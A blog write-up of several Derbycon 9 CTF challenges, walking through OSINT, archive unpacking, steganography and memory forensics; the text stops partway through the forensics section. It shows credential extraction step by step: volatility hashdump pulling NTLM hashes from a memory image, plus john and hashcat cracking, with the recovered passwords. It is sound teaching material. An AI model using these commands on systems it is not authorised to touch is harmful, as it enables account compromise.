---
layout: post
title: "Writeup: Derbycon 9 - Bank of America CTF"
description: "A write up of some of the challenges in this jeopardy-style CTF from Derbycon 9."
tags: pentest ctf
---

<!-- markdownlint-disable MD026 -->

I recently attended the final [Derbycon][] conference. I did not participate in the main conference capture-the-flag (CTF) event, but a jeopardy-style CTF provided by Bank of America caught my eye. Get 250 points and win a challenge coin? I couldn't resist. For two evenings I wracked up 260 points and won a coin! I wanted to write up my solution to some of the challenges to teach others some things I learned as well as provide notes for myself on future CTF events.

Unfortunately, I waited several weeks after the conference to begin writing this, and I forgot how I solved several of the challenges. This is why you should always take notes during your engagement, whether it's a challenge site or a real target! I may update this article if I take the time to resolve some of these challenges, but honestly, that probably won't happen. So, without further ado let's look at some of the challenges I _did_ remember how to solve.

## List of Challenges <!-- omit in toc -->

- [Trivia](#trivia)
  - [Who crashed 1507 computers in a single day?](#who-crashed-1507-computers-in-a-single-day)
  - [What season/episode of Mr Robot featured the Derbycon founder’s name used as a fake name by the protagonist?](#what-seasonepisode-of-mr-robot-featured-the-derbycon-founders-name-used-as-a-fake-name-by-the-protagonist)
  - [What is the name of the default wallpaper in Windows XP?](#what-is-the-name-of-the-default-wallpaper-in-windows-xp)
  - [300 of these counterfeit processors were sold to New Egg.](#300-of-these-counterfeit-processors-were-sold-to-new-egg)
  - [What is the FCC chairman's favorite candy?](#what-is-the-fcc-chairmans-favorite-candy)
- [General](#general)
  - [OSINT: Malware author intel for hire](#osint-malware-author-intel-for-hire)
  - [Do you like nesting dolls?](#do-you-like-nesting-dolls)
- [Binary](#binary)
  - [Crack the Code](#crack-the-code)
- [Steganography](#steganography)
  - [Find the Flag](#find-the-flag)
- [Password Cracking](#password-cracking)
  - [Zip & Pass](#zip--pass)
- [Cryptography](#cryptography)
  - [Solve the Cryptogram](#solve-the-cryptogram)
- [Forensics](#forensics)
  - [Forensics 101 (part 1)](#forensics-101-part-1)
  - [Forensics 101 (part 2)](#forensics-101-part-2)
  - [Forensics 101 (part 3)](#forensics-101-part-3)
  - [Forensics 101 (part 4)](#forensics-101-part-4)
  - [Forensics 101 (part 5)](#forensics-101-part-5)
  - [Forensics 101 (part 6)](#forensics-101-part-6)
  - [Firmware Hacked (part 1)](#firmware-hacked-part-1)
  - [Firmware Hacked (part 2)](#firmware-hacked-part-2)
- [Wrap-up](#wrap-up)

## Trivia

There were five 2-point challenges related to infosec trivia. I knocked these out of the way to get motivated with some points on the board.

### Who crashed 1507 computers in a single day?

This is an homage to one of the classic hacker films, [Hackers][hackers movie] (1995). The main protagonist, alias __Zero Cool__ (hint: this is the flag), crashed 1,507 computers at the tender age of 11, causing a 7-point drop in the New York Stock Exchange.

Hackers is a definite must-watch classic, but I think [Sneakers][sneakers movie] (1992) is the better 1990s hacker movie.

### What season/episode of Mr Robot featured the Derbycon founder’s name used as a fake name by the protagonist?

This is a fun fact about Derbycon's founder, Dave Kennedy. [Mr. Robot][mr robot] is an excellent hacker show [dedicated to providing realistic "hacking" behavior][mr robot hacking]. The exploits and commands the show's protagonists run are actual commands and are usually exactly what a real-life hacker would run in their situation. In season 3 episode 5, the main protagonist, Elliot, pretends to be called "Dave Kennedy" while escaping from law enforcement.

<iframe width="650" height="370" src="https://www.youtube.com/embed/z-iDNGxkQgE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

Let's submit our __S3E5__ flag and move on.

### What is the name of the default wallpaper in Windows XP?

Here we can do some quick [Google searching][default windows xp wallpaper]. We quickly see that the answer is __Bliss__.

### 300 of these counterfeit processors were sold to New Egg.

We run another Google search and come across this [Gizmodo article][gizmodo newegg processors]. The type of processor? __i7-920__.

And finally:

### What is the FCC chairman's favorite candy?

![Ajit Pai Reeses candy][ajit reeses]

## General

Now for some real challenges. I solved two out of three challenges in this category.

### OSINT: Malware author intel for hire

Points: 20

> We think a malware author has intel and is willing to share. Find his phone number and call or text him.
> Handle: @MalwareTrevor

Trevor is an [infamous cockroach][trevor] who lived and died during Derbycon 7. He first appeared in the milkshake of an attendee at a Shake Shack near the conference venue. Derbycon attendees have since held memorials for Trevor outside the Shake Shack, such as this touching tribute during Derbycon 9:

<blockquote class="twitter-tweet" data-dnt="true"><p lang="und" dir="ltr">.<a href="https://twitter.com/hashtag/TrevorForget?src=hash&amp;ref_src=twsrc%5Etfw">#TrevorForget</a> <a href="https://t.co/cRmeJB5AcT">pic.twitter.com/cRmeJB5AcT</a></p>&mdash; Zlata (@pavlova_zlata) <a href="https://twitter.com/pavlova_zlata/status/1170598427463442434?ref_src=twsrc%5Etfw">September 8, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

Now it appears Trevor has gone from milkshake spelunker to malware author. We'll have to put a stop to that! Let's find some personal information on MalwareTrevor.

The first thing to do is a general Google search to see what hits we get:

![Google search for @MalwareTrevor][trevor google]

Ok! They are on Twitter. Let's see what we get from their Twitter account.

![Twitter posts for @MalwareTrevor][trevor twitter]

A link to a Github gist!

![@MalTrevorMan Github gist][trevor gist]

Hmm... There doesn't seem to be anything useful in the gist. But, now we have the author's Github account.

![@MalTrevorMan Github profile][trevor github profile]

They keep their interesting stuff on Pastebin, do they? Off we go. Now, I don't know how to navigate Pastebin, so to find the proper URL for a user profile I made my own account and navigated to my profile. The URL was structured `https://pastebin.com/u/<USER>`. So, let's search both handles we've discovered for our malware author, MalwareTrevor and MalTrevorMan. MalwareTrevor didn't exist, however, we get a hit for MalTrevorMan.

![MalTrevorMan Pastebin post][trevor pastebin]

Here we see a contact paste for the malware author's Facebook account. The hunt continues! I had to make a throwaway Facebook account to view the link, but then:

![MalwareTrevor Facebook profile][trevor facebook]

Success! We have a telephone number for the malware author. When I texted the number, I received the flag to submit for this challenge.

### Do you like nesting dolls?

Points: 25

> Retrieve the flag.

This challenge included a downloadable _nesting_dolls.zip_ file. Inside the zip file was a `VSPWXKGO.tar.gz` file. Inside that was a `FCDLXQSE.7z` file. Inside that was a `XOREPDRA.7z` file. And so on... I actually did about 30 of these manually before looking at my terminal and thinking _wow. I am definitely doing this wrong._

I noticed that the archives were either `.zip`, `.tar.gz`, `.tar.bz2`, `.tar`, or `.7z`. I guessed that the final item would include `flag` in the title and wrote the following script. We clean up the old archive at each stage of the inception hell hole.

```bash
#!/bin/bash

isflag=$(find . -type f -name 'flag*' | wc -l)
while [ $isflag -eq 0 ]
do
    echo "Looking for flag";
    iszip=$(find . -type f -name '*.zip' | wc -l)
    if [ $iszip -gt 0 ]; then
        echo "Found a zip"
        find -type f -name "*.zip" -exec unzip '{}' \; -exec rm '{}' \;
    fi

    istargz=$(find . -type f -name '*.tar.gz' | wc -l)
    if [ $istargz -gt 0 ]; then
        echo "Found tar.gz"
        find -type f -name "*.tar.gz" -exec tar -xzf '{}' \; -exec rm '{}' \;
    fi

    isbz=$(find . -type f -name '*.tar.bz2' | wc -l)
    if [ $isbz -gt 0 ]; then
        echo "Found biz2"
        find -type f -name "*.tar.bz2" -exec bzip2 -d '{}' \;
    fi

    istar=$(find . -type f -name '*.tar' | wc -l)
    if [ $istar -gt 0 ]; then
        echo "Found tar"
        find -type f -name "*.tar" -exec tar -xf '{}' \; -exec rm '{}' \;
    fi

    isp7=$(find . -type f -name '*.7z' | wc -l)
    if [ $isp7 -gt 0 ]; then
        echo "Found 7z"
        find -type f -name "*.7z" -exec p7zip -d '{}' \;
    fi

    isflag=$(find . -type f -name 'flag*' | wc -l)
done
```

The script ran _247!_ iterations before stopping at `flag.png`.

![nesting dolls output][nesting output]

But we now have our flag:

![nesting dolls flag][nesting flag]

## Binary

I solved one out of four challenges in this category.

### Crack the Code

Points: 20

> Play the game or don't.

This challenge included a binary `Code_breaker`. Running `file` on this binary, we are told:

```bash
➜ file Code_breaker

Code_breaker: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=43508fb0003043cc72f66ae2c8723ace260bb95c, not stripped
```

Hmm. I don't know anything about reverse engineering. With a little searching, I find that [gdb][gdb] is the tool I need. I found [this StackExchange post][binary stackoverflow] that describes how to find the binary's entry point, set a breakpoint, and walk down the execution.

From the following snippet, we find __Entry point: 0x1290__. The only problem is that gdb couldn't access this entry point's memory location:

```bash
➜ gdb Code_breaker

GNU gdb (Ubuntu 8.1-0ubuntu3.1) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from Code_breaker...(no debugging symbols found)...done.
(gdb) info files
Symbols from "<redacted path>/Derbycon9/crack_the_code/Code_breaker".
Local exec file:
	`<redacted path>/Derbycon9/crack_the_code/Code_breaker',
        file type elf64-x86-64.
	Entry point: 0x1290
	0x0000000000000238 - 0x0000000000000254 is .interp
	0x0000000000000254 - 0x0000000000000274 is .note.ABI-tag
	0x0000000000000274 - 0x0000000000000298 is .note.gnu.build-id
	0x0000000000000298 - 0x00000000000002c0 is .gnu.hash
	0x00000000000002c0 - 0x0000000000000638 is .dynsym
	0x0000000000000638 - 0x0000000000000c1f is .dynstr
	0x0000000000000c20 - 0x0000000000000c6a is .gnu.version
	0x0000000000000c70 - 0x0000000000000cf0 is .gnu.version_r
	0x0000000000000cf0 - 0x0000000000000e40 is .rela.dyn
	0x0000000000000e40 - 0x00000000000010b0 is .rela.plt
	0x00000000000010b0 - 0x00000000000010c7 is .init
	0x00000000000010d0 - 0x0000000000001280 is .plt
	0x0000000000001280 - 0x0000000000001288 is .plt.got
	0x0000000000001290 - 0x0000000000001ef2 is .text
	0x0000000000001ef4 - 0x0000000000001efd is .fini
	0x0000000000001f00 - 0x000000000000206b is .rodata
	0x000000000000206c - 0x0000000000002100 is .eh_frame_hdr
	0x0000000000002100 - 0x00000000000023b4 is .eh_frame
	0x00000000000023b4 - 0x000000000000240e is .gcc_except_table
	0x0000000000202d98 - 0x0000000000202da8 is .init_array
	0x0000000000202da8 - 0x0000000000202db0 is .fini_array
	0x0000000000202db0 - 0x0000000000202db8 is .jcr
	0x0000000000202db8 - 0x0000000000202fc8 is .dynamic
	0x0000000000202fc8 - 0x0000000000203000 is .got
	0x0000000000203000 - 0x00000000002030e8 is .got.plt
	0x00000000002030e8 - 0x0000000000203100 is .data
	0x0000000000203100 - 0x0000000000203338 is .bss
(gdb) break *0x1290
Breakpoint 1 at 0x1290
(gdb) run
Starting program: <redacted path>/Derbycon9/crack_the_code/Code_breaker
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x1290
```

After a little more searching, I found this can happen when the program has a value hard-coded that it checks for, like:

```assembly
if (i == 0x1290) { ... } else { ... }
```

So, gdb is correctly informing me that the memory address `0x1290` does not exist. I was not able to figure out how to break this binary apart. Instead, I opted to play the game.

![Code breaker prompt][cracking code 1]

I was able to suss out the complicated rules of the game by entering a few guesses:

![Code breaker random guess][cracking code 2]

Ok, you enter 15 digits and the program tells you how many of those digits are in the correct position, and how many of the other digits are valid but in the wrong column. I can brute force this by modifying one column at a time until I know the correct value. The first digit is a 4:

![Code breaker second guess][cracking code 3]

With trial and error, I discover the value:

![Code breaker solution][cracking code 4]

Nice.

## Steganography

There was only one challenge in this category.

### Find the Flag

Points: 15

> Find the hidden hash.

This challenge came with a `Challenge_3.png` file. Ok, time to break out the steganography tools.

```bash
➜ steghide extract -sf Challenge_3.png

Enter passphrase:
```

I try a few random passwords, none work. Let's take a look at the metadata.

```bash
➜ exiftool Challenge_3.png

ExifTool Version Number         : 10.80
File Name                       : Challenge_3.png
Directory                       : .
File Size                       : 76 kB
File Modification Date/Time     : 2019:09:05 22:40:49-04:00
File Access Date/Time           : 2019:09:26 23:25:21-04:00
File Inode Change Date/Time     : 2019:09:05 23:01:20-04:00
File Permissions                : rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1000
Image Height                    : 1000
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Profile Name                    : sRGB IEC61966-2.1
Profile CMM Type                : Unknown (lcms)
Profile Version                 : 4.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2019:07:25 20:45:41
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             :
Device Model                    :
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Unknown (lcms)
Profile ID                      : 0
Profile Description             : sRGB IEC61966-2.1
Profile Copyright               : No copyright, use freely
Media White Point               : 0.9642 1 0.82491
Chromatic Adaptation            : 1.04788 0.02292 -0.05022 0.02959 0.99048 -0.01707 -0.00925 0.01508 0.75168
Red Matrix Column               : 0.43604 0.22249 0.01392
Blue Matrix Column              : 0.14305 0.06061 0.71391
Green Matrix Column             : 0.38512 0.7169 0.09706
Red Tone Reproduction Curve     : (Binary data 32 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 32 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 32 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown (0)
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
Pixels Per Unit X               : 3543
Pixels Per Unit Y               : 3543
Pixel Units                     : meters
Image Size                      : 1000x1000
Megapixels                      : 1.0
```

Err, ok. I don't actually know what I'm doing. Time to slow down, break out Google, and think. Wait, did I open the image yet?

![Challenge 3 steganography][challenge 3]

Not too helpful. Wait! If I open it with Image Viewer...

![Challenge 3 transparent][]

## ENHANCE! <!-- omit in toc -->

![Challenge 3 enhanced][]

Oh. That reads __8f8c2ca5c4bed32e4b364fe26df7f048__. Cool. Hackercat can rein it in.

![Hackercat][]

This is a good reminder to always take a moment to breathe and plan out your attack to make sure you stay on target.

## Password Cracking

There was only one challenge in this category.

### Zip & Pass

Points: 10

> Simple, open the zip. Password is numeric.

This challenge gives you a `ctf.zip` file. Having learned my lesson on the previous challenge, I'm going to double-check:

```bash
➜ unzip ctf.zip

Archive:  ctf.zip
[ctf.zip] flag.txt password:
   skipping: flag.txt                incorrect password
```

Ok, definitely password-protected. But this is back in territory in which I'm familiar. [john][] is the tool we want. [This][crack encrypted zip] is a great article to follow on how to crack an encrypted zip file.

So, first step is to [compile the jumbo version of john the ripper][john install]. We need the jumbo version for its `zip2john` script that will take an encrypted zip file and hash it appropriately so we can try to crack it.

```bash
git clone https://github.com/magnumripper/JohnTheRipper.git
cd JohnTheRipper && git checkout bleeding-jumbo
cd src
./configure && make -s clean && make -sj4
cd ../run
./john --test
```

What we want to do now is call the following, assuming we have moved back to the directory with the `ctf.zip` file.

```bash
<path/to/john>/run/zip2john ctf.zip
```

That should give us:

```bash
ver 1.0 efh 5455 efh 7875 ctf.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=B9F36741
ctf.zip/flag.txt:$pkzip2$1*2*2*0*34*28*b9f36741*0*42*0*34*b9f3*8468*f80798210ffe881c173582f883279cff09de606c168d3f225c5e638f60aec160508d97fae4fe41018fb2e31dcb749df37edaf9cc*$/pkzip2$:flag.txt:ctf.zip::ctf.zip
```

Now let's extract out just the bit we care about:

```bash
<path/to/john>/run/zip2john ctf.zip | cut -d ':' -f 2 > hash.txt
```

That will give us a `hash.txt` file with the contents:

```plain
$pkzip2$1*2*2*0*34*28*b9f36741*0*42*0*34*b9f3*8468*f80798210ffe881c173582f883279cff09de606c168d3f225c5e638f60aec160508d97fae4fe41018fb2e31dcb749df37edaf9cc*$/pkzip2$
```

Now we have a hash to crack. We could pass in a custom wordlist, but we don't need to. john has a default wordlist it will use.

```bash
➜ <path/to/john>/run/john hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 12 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:<path/to/john>/run/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
887766           (?)
1g 0:00:00:15 DONE 3/3 (2019-09-27 00:00) 0.06397g/s 17625Kp/s 17625Kc/s 17625KC/s 886tt5..883mhd
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Looks like it took about 15 seconds to crack. We can view the results with:

```bash
➜ <path/to/john>/run/john hash.txt --show

?:887766

1 password hash cracked, 0 left
```

The password appears to be __887766__. Let's open our zip file and supply this password:

```bash
➜ unzip ctf.zip

Archive:  ctf.zip
[ctf.zip] flag.txt password:
 extracting: flag.txt  
 ```

 ```bash
➜ cat flag.txt

Flag = e081129432efb65d52150e47f45899d1
```

## Cryptography

I only solved one out of six challenges in this category.

### Solve the Cryptogram

Points: 20

> Decode this message and submit the answer.
> GXFZ YO ZXC OCTSIH CIZJR YI ZXC JZUE YIHCD MIHCJ ZXC KCZZCJ Z

A cryptogram! This is a strong signal to go straight to the trusty [quipqiup][]. We enter our puzzle and click solve, and we see the following results:

![Quipqiup cryptogram results][cryptogram]

Result #4 looks like our winner. _What is the second entry in the RTFM index under the letter T?_ I had left my copy of RTFM at home, but I found [this PDF copy][rtfm] on Github. The index begins on page 95, and the second entry under 'T' is __TCPDump__.

## Forensics

I solved eight of the 10 challenges in this category. This was my first real foray into memory forensics challenges, so I spent a lot of time in this area and learned a lot. It paid off!

### Forensics 101 (part 1)

Points: 10

> What is the name of the logged-in user?

This challenge provided a `memdump.mem` file. I did some searching and identified [volatility][] as the tool I needed to learn. I had a lot of fun with this tool. Volatility is a memory forensics framework. I learned how to use volatility from a few resources. [This webpage][volatility basics] was a great primer on the basic usage of the tool. [This cheat sheet from SANS][volatility sans] was also helpful, as well as volatility's [command reference][volatility commands]. Let's see how it works.

I installed it with `sudo apt install volatility`.

The first thing to do is to examine the memory image you are working with:

```bash
➜ volatility -f memdump.mem imageinfo

Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (<redacted path>/Derbycon9/forensics101/memdump.mem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a39110L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a3ad00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-07-26 19:37:05 UTC+0000
     Image local date and time : 2019-07-26 12:37:05 -0700
```

Volatility examines the image and attempts to determine what OS it came from. As you can see, it isn't really sure and provides several different Windows versions. I ended up using the first profile, `Win7SP1x64`.

My goal is to find the logged-in user? Let's use volatility to look at recent terminal history:

```bash
➜ volatility --profile=Win7SP1x64 -f memdump.mem consoles

Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 1612
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: -
Title: -
----
CommandHistory: 0x2515a0 Application: - Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x58
----
CommandHistory: 0x2512f0 Application: cygrunsrv.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
Screen 0x26fdd0 X:80 Y:300
Dump:

**************************************************
ConsoleProcess: conhost.exe Pid: 744
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: Administrator: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1940 Handle: 0x60
----
CommandHistory: 0x22ef70 Application: whoami.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x22ec50 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0x22d810: whoami
----
Screen 0x211100 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\CTF-User-Admin>whoami
ctf-win-7\ctf-user-admin

C:\Users\CTF-User-Admin>
**************************************************
ConsoleProcess: conhost.exe Pid: 1760
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: C:\Users\CTF-User-Admin\Desktop\flag449.exe
Title: C:\Users\CTF-User-Admin\Desktop\flag449.exe
AttachedProcess: flag449.exe Pid: 2368 Handle: 0x60
----
CommandHistory: 0x21ecb0 Application: flag449.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
----
Screen 0x201170 X:80 Y:300
Dump:
Please Enter Password:
```

It looks like __ctf-user-admin__ most recently used this machine.

### Forensics 101 (part 2)

Points: 30

> What is the user's password?

Ok, Windows' passwords are stored inside `C:\windows\system32\config\SAM`. I have to figure out how to retrieve the contents of that file through volatility. I need to learn a little bit more about how Windows works. The SAM file is locked by the kernel and not accessible when the operating system is booted up. This file is encrypted with a key stored in `C:\windows\system32\config\system` which is similarly locked from access. During boot, Windows will decrypt the values in the SAM file using the key in the system file and load the hashes into the registry. Windows uses NTLM hashes, which are [known to be quite weak][ntlm bad]. An important concept is Windows' [registry hives][]. In particular, it would be really cool if we could see inside the `HKEY_LOCAL_MACHINE\SAM` hive.

It turns out, volatility makes this really simple for us. Volatility has a [`hivelist` command][hivelist] to locate the virtual addresses of registry hives in memory. We can then use the [`hashdump` command][hashdump] to retrieve cached domain credentials out of the registry hive. We need to pass `hashdump` the virtual addresses of `\windows\system32\config\SAM` (`-s`) and `\registry\machine\system` (`-y`) so volatility can decrypt the hashes.

```bash
➜ volatility --profile=Win7SP1x64 -f memdump.mem hivelist

Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a004d64010 0x000000002311d010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a00000f010 0x000000002719a010 [no name]
0xfffff8a000024010 0x00000000270a5010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a0000531f0 0x00000000271d41f0 \REGISTRY\MACHINE\HARDWARE
0xfffff8a000534410 0x0000000024038410 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a000549010 0x0000000023ff8010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000d21010 0x0000000021127010 \SystemRoot\System32\Config\SECURITY
0xfffff8a000d93010 0x0000000018bff010 \SystemRoot\System32\Config\SAM
0xfffff8a000e06010 0x00000000185ff010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a000e98010 0x0000000017f08010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a0010c6010 0x0000000010ce9010 \??\C:\Users\sshd_server\ntuser.dat
0xfffff8a001152010 0x00000000101b7010 \??\C:\Users\sshd_server\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a0011cf010 0x000000000f764010 \??\C:\System Volume Information\Syscache.hve
0xfffff8a0014c0010 0x00000000309e3010 \??\C:\Users\CTF-User-Admin\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a001a6b410 0x0000000035afa410 \??\C:\Users\CTF-User-Admin\ntuser.dat
```

Since we want the virtual addresses, we grab `0xfffff8a000024010 \REGISTRY\MACHINE\SYSTEM` and `0xfffff8a000d93010 \SystemRoot\System32\Config\SAM`. Now for the `hashdump` command:

```bash
➜ volatility hashdump -y 0xfffff8a000024010 -s 0xfffff8a000d93010 --profile=Win7SP1x64 -f memdump.mem

Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
CTF-User-Admin:1003:aad3b435b51404eeaad3b435b51404ee:902122102d5d2b0e3221e6ba4a00f7b9:::
```

We have the password hashes! But we still need to crack them. Let's extract the hashes from the output above and move them to a file. We will extract out the NTLM hashes from our result (the last value between the colons).

![Volatility hashdump hashes][]

To crack these hashes we will use [hashcat][]. I installed it with `sudo apt install hashcat`. Hashcat is similar to john the ripper. People claim that there are differences but I don't believe them. Both are very powerful tools and, depending on the provided wordlist and cracking parameters, each can outperform the other. In this case, we used john in a previous challenge so let's look at how we would use hashcat:

```bash
➜ hashcat -O -m 1000 -a 3 forensics_101_ch2_hashes_LM.txt

hashcat (v5.1.0) starting...
```

The `-O` tells hashcat to optimize the workload to my kernel. The set of hashes is so small this makes no impact, but it's good to know about. We have to tell hashcat what type of hash we're working with along with the level of aggressiveness we want hashcat to work. `-m 1000` tells hashcat that we are giving it NTLM hashes. `-a 3` tells hashcat to use the brute-force attack mode.

And off we go.

```bash
Session..........: hashcat
Status...........: Running
Hash.Type........: NTLM
Hash.Target......: forensics_101_ch2_hashes_LM.txt
Time.Started.....: Fri Sep 27 20:08:33 2019 (31 secs)
Time.Estimated...: Fri Sep 27 20:20:54 2019 (11 mins, 50 secs)
Guess.Mask.......: ?1?2?2?2?2?2?2?3 [8]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined 
Guess.Queue......: 8/15 (53.33%)
Speed.#1.........:  7466.3 MH/s (9.69ms) @ Accel:256 Loops:128 Thr:256 Vec:1
Recovered........: 0/4 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 230744391680/5533380698112 (4.17%)
Rejected.........: 0/230744391680 (0.00%)
Restore.Point....: 102891520/2479113216 (4.15%)
Restore.Sub.#1...: Salt:0 Amplifier:1664-1792 Iteration:0-128
Candidates.#1....: Iqplb9p$ -> Vsyadnp$
Hardware.Mon.#1..: Temp: 69c Util: 94% Core:1607MHz Mem:3802MHz Bus:16

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: NTLM
Hash.Target......: forensics_101_ch2_hashes_LM.txt
Time.Started.....: Fri Sep 27 20:08:33 2019 (3 mins, 55 secs)
Time.Estimated...: Fri Sep 27 20:20:54 2019 (8 mins, 26 secs)
Guess.Mask.......: ?1?2?2?2?2?2?2?3 [8]
Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined 
Guess.Queue......: 8/15 (53.33%)
Speed.#1.........:  7459.3 MH/s (9.75ms) @ Accel:256 Loops:128 Thr:256 Vec:1
Recovered........: 0/4 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 1758325637120/5533380698112 (31.78%)
Rejected.........: 0/1758325637120 (0.00%)
Restore.Point....: 787742720/2479113216 (31.78%)
Restore.Sub.#1...: Salt:0 Amplifier:128-256 Iteration:0-128
Candidates.#1....: b2r6201@ -> p4ku3e1@
Hardware.Mon.#1..: Temp: 78c Util: 93% Core:1607MHz Mem:3802MHz Bus:16
```

About 8 minutes in on my machine, we get our first hit:

![hashcat ctfadmin hash][ctfadmin hash]

One password is __ctfadmin__. If we match this hash to the list of users in the volatility `hashdump` command, we tie this to the ctf-user-admin user. Great! At this point, we have solved the challenge, but if you leave hashcat working you will get an additional hash:

```bash
➜ hashcat -O -m 1000 -a 3 forensics_101_ch2_hashes_LM.txt --show

fc525c9683e8fe067095ba2ddc971889:Passw0rd!
902122102d5d2b0e3221e6ba4a00f7b9:ctfadmin
```

`--show` lets us look up the values that hashcat has cracked previously from hashcat's [potfile][hashcat potfile]. Looks like the system administrator's password is `Passw0rd!`. Many secure.

__Note__: My colleague reminded me that he solved this challenge with john with the command `john --format=nt forensics.hash  --wordlist=/usr/share/wordlists/rockyou.txt`. `rockyou.txt` is one of the default wordlists on Kali Linux. With this command, john cracked the above passwords in seconds, whereas my hashcat command took about 8 minutes for the first hash and several minutes more for the second.

### Forensics 101 (part 3)

Points: 10

> What is the hostname of the system?

Surely somewhere in this memory dump is the hostname of the computer. Indeed, the internet tells me that the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName` registry key contains the hostname. Volatility's [`printkey` command][printkey] will let us read the value of this key. We can pass a specific hive to `printkey` with the `-o` option. Let's run `hivelist` again to pull up those virtual addresses:

```bash
➜ volatility --profile=Win7SP1x64 -f memdump.mem hivelist

Volatility Foundation Volatility Framework 2.6
